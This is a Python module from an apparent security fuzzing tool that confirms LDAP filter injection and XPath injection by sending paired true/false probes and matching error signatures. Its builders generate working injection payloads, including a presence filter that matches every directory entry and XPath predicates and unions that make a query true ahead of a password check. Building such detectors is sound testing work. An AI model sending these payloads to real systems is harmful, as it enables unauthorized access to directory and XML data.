"""LDAP filter injection and XPath injection confirmation strategies (FR-FUZZ-620, 621).

Both are boolean differentials on the shared bracketed, replicated engine
(`ConfirmationStrategy._differential`, FR-FUZZ-45 (a), PA-0117): a base value B, a value
V the query language evaluates **false** (it must look like B), and a value D it
evaluates **true** (it must not), each round with fresh tokens, in a drawn order. The
engine's bound (``ENGINE_BOUND``, 1/1458 per family for any probe-independent answer
sequence) holds unchanged. Error signatures are secondary evidence only: recorded as
corroboration on a confirmed verdict, never a verdict on their own.

V and D differ only in what the target's query language computes from them -- never in
the characters a lexical filter could single out -- so a page that rejects ``*``, a
quote or a parenthesis answers V and D alike, and gives no verdict:

* **LDAP** (`LdapFilterInjectionStrategy`): ``b)(objectClass=u*`` / ``b)(objectClass=*``.
  Closing the value's parenthesis adds a filter item: V's is a substring filter no
  entry matches, D's a presence filter every entry matches. In an OR filter
  (``(|(cn=a)(cn=<v>))``) D selects every entry. A SQL, NoSQL, glob or plain-text sink
  reads both as literals that match nothing (measured, Mutillidae II 2.12.8, CC-FUZZ-0620).
* **XPath** (`XPathInjectionStrategy`): ``b' or string-length('u')=n+1 or 'v'='w`` /
  ``... =n ...`` (a predicate), and ``b'] | //*[string-length('u')=n+1 or 'v'='w`` /
  ``... =n ...`` (a union, which selects nodes whatever the queried element is called).
  ``string-length`` is an XPath function: SQL reads ``string - length('u')`` and fails
  on V and D alike, so V is not like B and no verdict follows; the trailing
  ``or 'v'='w`` keeps the query balanced and makes D true before a following
  ``and Password='…'``.

Read-only: every probe is a search filter or a query predicate; nothing is written. A
point whose value is written with a filter (an LDAP modify by search) is as exposed as
SQL injection's boolean probe, under the same lab-only posture."""

from __future__ import annotations

import re
import secrets

from fuzzlab.oracle.probe import Verdict
from fuzzlab.oracle.strategies import (FAMILY_COST, ConfirmationStrategy, _engine_rng,
                                       _Family)

#: LDAP client/server error texts (PHP ext/ldap, JNDI, python-ldap, .NET, OpenLDAP).
LDAP_ERROR_SIGNATURES = (
    re.compile(r"ldap_search\(\)|ldap_list\(\)|ldap_read\(\)", re.I),
    re.compile(r"bad search filter", re.I),
    re.compile(r"InvalidSearchFilterException|javax\.naming\.directory", re.I),
    re.compile(r"ldap\.FILTER_ERROR|invalid (?:ldap )?filter", re.I),
    re.compile(r"System\.DirectoryServices", re.I),
)

#: XPath engine error texts (PHP SimpleXML / DOMXPath, libxml2, javax.xml.xpath, .NET,
#: lxml).
XPATH_ERROR_SIGNATURES = (
    re.compile(r"SimpleXMLElement::xpath\(\)|DOMXPath::(?:query|evaluate)\(\)", re.I),
    re.compile(r"Invalid (?:predicate|expression)", re.I),
    re.compile(r"XPathException|javax\.xml\.xpath|XPathEvalError", re.I),
    re.compile(r"System\.Xml\.XPath", re.I),
)


def _tok(prefix: str) -> str:
    """An alphanumeric token: never an LDAP filter, XPath or SQL metacharacter."""
    return prefix + secrets.token_hex(4)


def _corroboration(texts: list[str], base: str, signatures) -> list[str]:
    """Error signatures in the differential's answers that the baseline lacks."""
    return sorted({m.group(0) for text in texts for rx in signatures
                   for m in [rx.search(text)] if m and not rx.search(base)})


# --- LDAP ---------------------------------------------------------------------------

def _ldap_base() -> str:
    return _tok("zql")


def _ldap_keep(base: str) -> str:
    return f"{base})(objectClass={_tok('zqu')}*"


def _ldap_disc(base: str) -> str:
    return f"{base})(objectClass=*"


_LDAP_FAMILIES = (
    _Family("or-presence", base=_ldap_base, keep=_ldap_keep, disc=_ldap_disc,
            exact=True, strings=True),
)


# --- XPath --------------------------------------------------------------------------

def _xpath_base() -> str:
    return _tok("zqx")


def _length_test(true: bool) -> str:
    """``string-length('u')=n`` (true) or ``=n+1`` (false), with a fresh ``u``."""
    u = _tok("zqs")
    return f"string-length('{u}')={len(u) + (0 if true else 1)}"


def _never() -> str:
    a, b = _tok("zqa"), _tok("zqb")
    return f"'{a}'='{b}"


def _predicate(true: bool):
    return lambda base: f"{base}' or {_length_test(true)} or {_never()}"


def _union(true: bool):
    return lambda base: f"{base}'] | //*[{_length_test(true)} or {_never()}"


_XPATH_FAMILIES = (
    _Family("string-predicate", base=_xpath_base, keep=_predicate(False),
            disc=_predicate(True), exact=True, strings=True),
    _Family("string-union", base=_xpath_base, keep=_union(False), disc=_union(True),
            exact=True, strings=True),
)


class _QueryLanguageDifferential(ConfirmationStrategy):
    """Runs each family through the shared engine, cheapest first; the first family to
    confirm wins. A family starts only when ``FAMILY_COST`` requests remain under
    ``HARD_CAP``; a later family the cap stops after an earlier one passed its screen
    makes the verdict inconclusive (as `SqliBooleanStrategy`). String families are
    skipped on a raw whole-body point (a JSON or XML body is not a string slot)."""
    _FAMILIES: tuple[_Family, ...] = ()
    _SIGNATURES: tuple = ()

    @property
    def HARD_CAP(self) -> int:        # noqa: N802 - the SQL strategy's name
        return FAMILY_COST * len(self._FAMILIES)

    def confirm(self, candidate, sender, rng=None):
        rng = rng if rng is not None else _engine_rng()
        spent, exhausted = 0, []
        for family in self._FAMILIES:
            if family.strings and candidate.content_type:
                continue
            if self.HARD_CAP - spent < FAMILY_COST:
                exhausted.append(family.name)
                continue
            evidence, cost = self._differential(sender, candidate, family, rng=rng)
            spent += cost
            if evidence is not None:
                d_texts, b0_text = evidence.pop("_d_texts"), evidence.pop("_b0_text")
                evidence["corroboration"] = _corroboration(d_texts, b0_text,
                                                           self._SIGNATURES)
                evidence["requests"] = spent
                return Verdict(True, self.vuln_class, self.mechanism, evidence)
        if exhausted:
            return Verdict(False, self.vuln_class, self.mechanism,
                           {"cap_exhausted": True, "families_not_started": exhausted,
                            "requests": spent}, inconclusive=True)
        return None


class LdapFilterInjectionStrategy(_QueryLanguageDifferential):
    """LDAP filter injection (CWE-90, FR-FUZZ-620): see the module doc. One family
    (``or-presence``): 21 requests to confirm, 3 when its screen fails."""
    vuln_class = "ldap_injection"
    mechanism = "filter-boolean-differential"
    category = "ldap-injection"
    _FAMILIES = _LDAP_FAMILIES
    _SIGNATURES = LDAP_ERROR_SIGNATURES


class XPathInjectionStrategy(_QueryLanguageDifferential):
    """XPath injection (CWE-643, FR-FUZZ-621): see the module doc. Two families
    (``string-predicate``, ``string-union``): at most 42 requests, 6 when both screens
    fail."""
    vuln_class = "xpath_injection"
    mechanism = "xpath-boolean-differential"
    category = "xpath-injection"
    _FAMILIES = _XPATH_FAMILIES
    _SIGNATURES = XPATH_ERROR_SIGNATURES
